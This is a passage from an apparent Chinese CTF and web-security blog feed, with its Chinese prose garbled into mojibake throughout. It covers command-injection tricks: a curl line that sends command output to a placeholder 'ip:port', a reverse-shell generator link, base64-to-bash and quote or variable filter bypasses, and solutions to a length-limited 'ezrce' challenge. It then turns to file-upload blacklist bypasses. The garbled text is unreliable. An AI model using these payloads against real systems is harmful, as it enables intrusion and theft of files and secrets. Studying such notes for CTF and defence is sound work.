class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“ </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› ä¸º1æ˜¯è¾“å‡ºå†…å®¹ stream_get_contents â€” è¯»å–èµ„æºæµåˆ°ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹"><a href="#åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹" class="headerlink" title="åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹"></a>åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹</h2><p>æœ‰å›æ˜¾æƒ…å†µ</p><p>pingå‘½ä»¤è§‚å¯ŸTTLã€‚</p><p>æ— å›æ˜¾æƒ…å†µ</p><ul><li><p>è·¯å¾„å¤§å°å†™æ•æ„Ÿ</p></li><li><p>é€šè¿‡<code>ping</code>å‘½ä»¤</p><blockquote><p>Windowsä¸‹çš„Pingå‘½ä»¤æ¯é—´éš”ä¸€ç§’ä¼šå‘é€ä¸€ä¸ªICMP ECHO_REQUEST åŒ…ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ Ping å‘½ä»¤æ¥è¿‘ä¼¼åœ°æ¨¡æ‹Ÿç­‰å¾…æŒ‡å®šç§’æ•°çš„æ•ˆæœ</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -n 2 127.0.0.1</span><br><span class="line">ping -n 3 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230519171132332.png" alt="image-20230519171132332"></p><p><img src="/../images/image-20230519171119146.png" alt="image-20230519171119146"></p></li></ul><h2 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h2><ul><li><p>åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŠ¥é”™</span><br><span class="line">å»¶æ—¶</span><br></pre></td></tr></table></figure></li><li><p>åå¼¹shell</p><p>åœ¨çº¿ç”Ÿæˆï¼š<a href="https://zgao.top/tools/reverse/">https://zgao.top/tools/reverse/</a></p></li><li><p>å¤–å¸¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ip:port\`cmd`</span><br><span class="line">dnslog</span><br></pre></td></tr></table></figure><p>ä¸å‡ºç½‘+DNSè¯·æ±‚å‡ºç½‘</p><p><a href="https://github.com/A0WaQ4/HexDnsEchoT">https://github.com/A0WaQ4/HexDnsEchoT</a></p></li><li><p>å°†æ–‡ä»¶ç§»åŠ¨åˆ°å¯è®¿é—®ç›®å½•ï¼ˆç½‘ç«™ç›®å½•ï¼Œé™æ€ æ–‡ä»¶ç›®å½•ï¼‰</p><ul><li><p>è¯»å–å†…å®¹é‡å®šå‘å†™å…¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag &gt;1</span><br></pre></td></tr></table></figure></li><li><p>å¤åˆ¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /f* .</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºé“¾æ¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /f* 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="å†™ğŸ"><a href="#å†™ğŸ" class="headerlink" title="å†™ğŸ"></a>å†™ğŸ</h3><h4 id="ç¡®å®šç½‘ç«™è·¯å¾„"><a href="#ç¡®å®šç½‘ç«™è·¯å¾„" class="headerlink" title="ç¡®å®šç½‘ç«™è·¯å¾„"></a>ç¡®å®šç½‘ç«™è·¯å¾„</h4><ul><li><p>Windows</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /x /s /b yokan_test.js</span><br><span class="line">for /r c:\ %i in (yokan_test.js*) do @echo %i</span><br><span class="line">dir /s/a-d/b yokan_test.js</span><br></pre></td></tr></table></figure></li><li><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -type f -name 1.js|while read f;do sh -c &#x27;id;pwd;hostname;/sbin/ifconfig&#x27; &gt;$(dirname $f)/test.txt;done</span><br><span class="line"></span><br><span class="line">locate /js/1.js|while read f;do sh -c &#x27;id;pwd;ifconfig&#x27;&gt;$(dirname $f)/test1.txt;done</span><br></pre></td></tr></table></figure></li></ul><h4 id="å‡ºç½‘"><a href="#å‡ºç½‘" class="headerlink" title="å‡ºç½‘"></a>å‡ºç½‘</h4><ul><li><p>è¿œç¨‹ä¸‹è½½</p><p><a href="https://paper.seebug.org/834/#windows">çº¢é˜Ÿåæ¸—é€æµ‹è¯•ä¸­çš„æ–‡ä»¶ä¼ è¾“æŠ€å·§</a></p></li><li><p>é‡å®šå‘å†™å…¥</p><blockquote><p><strong>webshellç‰¹æ®Šç¬¦å·é—®é¢˜ï¼Œå¯ä»¥å…ˆåšbase64ç¼–ç å†™å…¥ï¼Œç„¶åå†è§£ç </strong></p></blockquote></li></ul><h4 id="ä¸å‡ºç½‘"><a href="#ä¸å‡ºç½‘" class="headerlink" title="ä¸å‡ºç½‘"></a>ä¸å‡ºç½‘</h4><p>é‡å®šå‘å†™å…¥</p><h2 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="å¤šæ¡å‘½ä»¤æ‰§è¡Œ"><a href="#å¤šæ¡å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å¤šæ¡å‘½ä»¤æ‰§è¡Œ"></a>å¤šæ¡å‘½ä»¤æ‰§è¡Œ</h4><table><thead><tr><th align="center"></th><th align="center">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="center">|</td><td align="center">ç®¡é“ï¼Œå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</td></tr><tr><td align="center">ï¼›</td><td align="center">ä¾æ¬¡æ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">||</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">%0a  &#x2F; %0d%0a</td><td align="center">æ¢è¡Œæ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">&#96;&#96;</td><td align="center">å†…æ•›æ‰§è¡Œ</td></tr><tr><td align="center">$()</td><td align="center">å†…æ•›æ‰§è¡Œ</td></tr></tbody></table><h4 id=""><a href="#" class="headerlink" title="."></a>.</h4><p>Linux ä¸­ï¼Œ<code>.</code>ä¹Ÿå«<code>period</code>ï¼Œå®ƒçš„ä½œç”¨å’Œ<code>source</code>ä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„ shell æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„ shell æ˜¯ bashï¼Œåˆ™ <code>. filename</code>çš„æ„æ€å°±æ˜¯ç”¨ bash æ‰§è¡Œ filename æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</p><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><ol><li><p>base64</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;base64(payload)&#x27; | base64 -d | bash</span><br></pre></td></tr></table></figure></li><li><p>è¿›åˆ¶ç»•è¿‡</p><ul><li>shellè§£æå…«è¿›åˆ¶ï¼Œ<code>ls</code> â†’ <code>$&#39;\154&#39;$&#39;\163&#39;</code></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ $&#x27;\154&#x27;$&#x27;\163&#x27;</span><br><span class="line">1                           jdk-8u333-linux-x64.tar.gz:Zone.Identifier  result.txt     ysoserial.jar:Zone.Identifier</span><br><span class="line">jdk-8u333-linux-x64.tar.gz  jdk8</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">phpä¼ å‚æ—¶çš„æ ¼å¼</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">echo</span> <span class="string">&quot;\154\163&quot;</span>)</span></span><br></pre></td></tr></table></figure><ul><li>è¿›åˆ¶è½¬æ¢</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $((2#111))</span><br><span class="line">7</span><br></pre></td></tr></table></figure></li></ol><h4 id="phpç»•è¿‡"><a href="#phpç»•è¿‡" class="headerlink" title="phpç»•è¿‡"></a>phpç»•è¿‡</h4><p>phpèŠ±æ ·å°±å¤šäº†ğŸ˜‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;system(chr(108).chr(115))&#x27;</span><br></pre></td></tr></table></figure><h4 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"></a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h4><ol><li><p>æ’å…¥\</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat = ca\t = c\at = \cat</span><br></pre></td></tr></table></figure></li><li><p>æ’å…¥ç©ºå­—ç¬¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls = l&#x27;&#x27;s = l&quot;&quot;s = l&#x27;s&#x27; = l&quot;s&quot; ï¼ˆåªè¦æ’å…¥æˆå¯¹çš„å•åŒå¼•å·å°±å¯ä»¥ï¼‰</span><br><span class="line">= l$1s = l$&#123;asdfa&#125;s = l``s =  l$(``)s  =  l$(&#x27;&#x27;)s = l$(&quot;&quot;)s</span><br></pre></td></tr></table></figure><blockquote><p>$1~$9ä¸ºè„šæœ¬å‚æ•°</p><p>${xx}ä»£è¡¨å˜é‡å€¼,åªè¦xxæ²¡æœ‰å®šä¹‰å³å¯</p><p>å†…æ•›æ‰§è¡Œç©ºå‘½ä»¤</p></blockquote></li><li><p>å˜é‡æ‹¼æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;$a$b file</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&amp;&amp;ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿</p></blockquote></li><li><p>å…¶ä»–å‘½ä»¤ä»£æ›¿</p></li><li><p>æ–‡ä»¶åç”¨é€šé…ç¬¦</p></li></ol><h4 id="è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡"><a href="#è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡" class="headerlink" title="è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡"></a>è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-4-8-ubuntu:~$ echo  $PS2</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h4><ol><li><code>$&#123;IFS&#125;</code></li><li><code>$IFS</code>+ç©ºå­—ç¬¦</li><li>é‡å®šå‘ç¬¦</li><li><code>&#123;cat,flag.php&#125;</code></li><li>urlå‚æ•°ç¼–ç ï¼Œç©ºæ ¼%20ï¼Œåˆ¶è¡¨ç¬¦%09</li></ol><h4 id="ç›®å½•åˆ†éš”ç¬¦-ç»•è¿‡"><a href="#ç›®å½•åˆ†éš”ç¬¦-ç»•è¿‡" class="headerlink" title="ç›®å½•åˆ†éš”ç¬¦/ç»•è¿‡"></a>ç›®å½•åˆ†éš”ç¬¦<code>/</code>ç»•è¿‡</h4><ol><li><p>å¤šæ¡å‘½ä»¤æ‰§è¡Œï¼Œå…ˆcdåˆ°ç›®çš„ç›®å½•ï¼Œå†æ‰§è¡Œcatç­‰å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&amp;&amp;ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿</p></blockquote></li><li><p>æˆªå–ç¯å¢ƒå˜é‡</p><p><code>env</code>æˆ–è€…<code>printenv</code>ï¼šæ‰“å°ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ echo $&#123;PWD:0:1&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure></li></ol><h4 id="é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡"><a href="#é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡" class="headerlink" title="é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡"></a>é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;shell&quot; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h4 id="å†…æ•›æ‰§è¡Œç»•è¿‡"><a href="#å†…æ•›æ‰§è¡Œç»•è¿‡" class="headerlink" title="å†…æ•›æ‰§è¡Œç»•è¿‡"></a>å†…æ•›æ‰§è¡Œç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><h4 id="é•¿åº¦é™åˆ¶ç»•è¿‡"><a href="#é•¿åº¦é™åˆ¶ç»•è¿‡" class="headerlink" title="é•¿åº¦é™åˆ¶ç»•è¿‡"></a>é•¿åº¦é™åˆ¶ç»•è¿‡</h4><h5 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h5><ol><li><p>lsè¾“å‡ºçš„ç»“æœæ˜¯æŒ‰ç…§å­—å…¸æ’åºçš„</p><p><img src="/../images/image-20221017101847464.png" alt="image-20221017101847464"></p></li><li><p>\æ”¾åœ¨æŒ‡ä»¤çš„æœ€æœ«ç«¯ï¼Œè¡¨ç¤ºæŒ‡ä»¤è¿æ¥ä¸‹ä¸€è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line">da</span><br></pre></td></tr></table></figure></li><li><p><code>ls -t &gt; a</code>å°†æ–‡ä»¶åï¼ˆå‘½ä»¤ï¼‰æŒ‰æ—¶é—´é‡å®šå‘åˆ°è„šæœ¬æ–‡ä»¶aä¸­ï¼Œ<code>sh a</code>æ‰§è¡Œè„šæœ¬aã€‚</p><p>æ³¨ï¼šå°†æ‰§è¡Œçš„å‘½ä»¤ååºç”Ÿæˆã€‚<code>\\</code>æ˜¯ä¸ºäº†è½¬ä¹‰ï¼Œè®©æ–‡ä»¶åå¸¦ä¸Š\</p><img src="../images/1650186228_625bd7f4927774ad69919.png!small" alt="img" style="zoom:150%;" /></li><li><p>å•ç‹¬ä¸€ä¸ª<code>*</code>ä¼šå°†ç›®å½•ä¸‹çš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸æ’åºæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶åä¸ºå‘½ä»¤ï¼Œå…¶ä»–ä¸ºè¯¥å‘½ä»¤çš„å‚æ•°</p><p><code>echo hello</code></p><p><img src="/../images/image-20221017102117317.png" alt="image-20221017102117317"></p><p>åœ¨è¿™ä¸ªåŸºç¡€ä¸Š<code>*o</code>ä¹Ÿå¯ä»¥ï¼Œå°±æ˜¯å–å‡ºæ»¡è¶³æ­£åˆ™*oçš„æ–‡ä»¶åæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="/../images/image-20221017102322441.png" alt="image-20221017102322441"></p></li></ol><h5 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezrce"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezrce" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce</h5><p>ç»™å‡ºäº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¥å£ï¼Œæµ‹è¯•ä¹‹åå‘ç°é•¿åº¦é™åˆ¶ä¸º6,æ­£å¸¸æ€è·¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686.png" alt="image-20221107112233686"></p><p>ç„¶åå°è¯•è®¿é—®&#x2F;tmp&#x2F;aï¼ŒæœåŠ¡å™¨æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜<code>&gt;a</code>å…¶å®æ˜¯æ‰§è¡ŒæˆåŠŸäº†çš„ã€‚</p><ul><li><p>è§£æ³•1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºcpçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>cp /* .</code>ï¼Œå°†æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;flagå³å¯</p><p><img src="/../images/image-20221107113239425.png" alt="image-20221107113239425"></p></li><li><p>è§£æ³•2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºnlçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>nl /*&gt;a</code>ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°aä¸­ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;aå³å¯</p><p><img src="/../images/image-20221107113608245.png" alt="image-20221107113608245"></p></li><li><p>è§£æ³•3</p><p>è„šæœ¬ç›´æ¥å†™ğŸ</p></li></ul><h4 id="æ— æ•°å­—ç»•è¿‡"><a href="#æ— æ•°å­—ç»•è¿‡" class="headerlink" title="æ— æ•°å­—ç»•è¿‡"></a>æ— æ•°å­—ç»•è¿‡</h4><p>å®‰æ´µæ¯2020[Web-Bash-Vino0o0o]</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$white_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;$&#123;#&#125;\\(&lt;)\&#x27;0&#x27;</span>); </span><br><span class="line">    <span class="variable">$char_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$char_list</span> <span class="keyword">as</span> <span class="variable">$c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$c</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Cyzcc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªèƒ½ç”¨$</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´å±å®³â€“æ”»å‡»é¢"><a href="#æ¼æ´å±å®³â€“æ”»å‡»é¢" class="headerlink" title="æ¼æ´å±å®³â€“æ”»å‡»é¢"></a>æ¼æ´å±å®³â€“æ”»å‡»é¢</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshellç±»ï¼šè„šæœ¬æ–‡ä»¶</span><br><span class="line">XSSç±»ï¼šsvgï¼Œhtmlï¼Œpdfæ–‡ä»¶,å¦‚æœåç«¯ä¸ºnodejsï¼Œå¯ä»¥xss to rce</span><br><span class="line">SSRFç±»ï¼šPDF</span><br><span class="line">XXEç±»ï¼šdocxã€xlsxï¼Œsvg</span><br><span class="line">RCEç±»ï¼špharæ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–æ”»å‡» # é¸¡è‚‹ï¼Œè¦æœ‰æºç ï¼Œè¿˜è¦æœ‰å±é™©æ–¹æ³•</span><br><span class="line">ç›®å½•ç©¿è¶Šï¼šæ–‡ä»¶è¦†ç›–ï¼Œsshå…¬é’¥</span><br></pre></td></tr></table></figure><p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">PDFè§£æå™¨html&#x2F;XSS å®ç°SSRF - ç«çº¿ Zone-å®‰å…¨æ”»é˜²ç¤¾åŒº</a></p><h1 id="PHPç›¸å…³ä»£ç "><a href="#PHPç›¸å…³ä»£ç " class="headerlink" title="PHPç›¸å…³ä»£ç "></a>PHPç›¸å…³ä»£ç </h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;file&#x27;]æ˜¯Content-Dispositionä¸­nameçš„å€¼</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] å®¢æˆ·ç«¯æ–‡ä»¶åç§°</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] æ–‡ä»¶çš„MIMEç±»å‹       image/jpeg,image/png</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] æ–‡ä»¶å¤§å° å•ä½å­—èŠ‚</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] æ–‡ä»¶è¢«ä¸Šä¼ åå†æœåŠ¡å™¨ç«¯ä¸´æ—¶æ–‡ä»¶åï¼Œå¯ä»¥åœ¨php.iniä¸­æŒ‡å®š</span><br><span class="line">    </span><br><span class="line"><span class="comment"># åŠ å…¥æ–‡ä»¶å¤´ç»•è¿‡ï¼šGIF89a  </span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()  å›¾ç‰‡å¤§å°</span><br><span class="line"><span class="title function_ invoke__">exif_imagetype</span>()  å›¾ç‰‡ç±»å‹</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è¿‡ç¨‹</p><blockquote><p>åœ¨æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œæ–‡ä»¶é»˜è®¤è¢«å‚¨å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­ï¼Œè¿™æ—¶å¿…é¡»æŠŠä»–ä»ä¸´æ—¶ç›®å½•ä¸­åˆ é™¤æˆ–ç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œå¦åˆ™ï¼Œè„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>copyæˆ–</code>è€…<code>move_uploaded_file</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">       <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h1><ul><li><p>ä¸­é—´ä»¶é…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥è§£æå…¶ä»–è„šæœ¬åç¼€</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">.phpx  .phtml</span><br><span class="line">    </span><br><span class="line"><span class="comment"># jsp    </span></span><br><span class="line">.jsp .jspa .jsps .jspx </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .net</span></span><br><span class="line">.asp  .asa .cdx  .cer  .aspx .asmx  .ashx</span><br></pre></td></tr></table></figure></li><li><p>å¯ä»¥ä¸Šä¼ ç›¸å…³é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Apache</span></span><br><span class="line">.htaccess  .user.ini</span><br></pre></td></tr></table></figure></li></ul><p>â€‹<a href="https://blog.csdn.net/solitudi/article/details/116666720">CTF.htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“_.htaccess ctf_Y4tackerçš„åšå®¢-CSDNåšå®¢</a></p><ul><li><p>è¿‡æ»¤ä¸å½“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç‚¹ç»•è¿‡ã€ç©ºæ ¼ç»•è¿‡ã€åç¼€åŒå†™ç»•è¿‡ã€åç¼€å¤§å°å†™ç»•è¿‡</span><br></pre></td></tr></table></figure></li><li><p>Apacheä»å·¦åˆ°å³è§£ææ¼æ´</p></li></ul><h1 